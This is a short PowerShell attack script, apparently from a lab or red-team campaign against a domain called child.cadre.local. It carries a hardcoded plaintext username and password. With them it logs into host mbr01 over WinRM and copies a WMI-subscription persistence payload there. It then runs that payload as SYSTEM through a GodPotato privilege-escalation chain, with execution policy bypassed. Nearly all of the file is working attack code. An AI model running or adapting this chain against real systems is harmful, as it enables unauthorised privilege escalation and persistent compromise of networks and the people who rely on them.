[CmdletBinding()]
param(
    [string]$Server = "192.168.77.22",
    [string]$Username = "analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$GpPath = "C:\Windows\Temp\cadre-tools\GodPotato.exe",
    [string]$Payload = "C:\Windows\Temp\cadre-tools\campaign-a-t035j-wmi-subscription-payload.ps1"
)
$ErrorActionPreference = "Stop"

# Stage payload to mbr01 over WinRM (analyst_t1 has write access to C:\Windows\Temp\cadre-tools)
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName "mbr01.child.cadre.local" -Credential $cred
Copy-Item -Path "$PSScriptRoot\campaign-a-t035j-wmi-subscription-payload.ps1" -Destination $Payload -ToSession $session -Force
Remove-PSSession $session
Write-Output "PAYLOAD_STAGED"

# Run payload as SYSTEM via GodPotato chain (short SQL command)
& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -GpPath $GpPath -ScriptBlock "powershell -NoProfile -ExecutionPolicy Bypass -File $Payload"
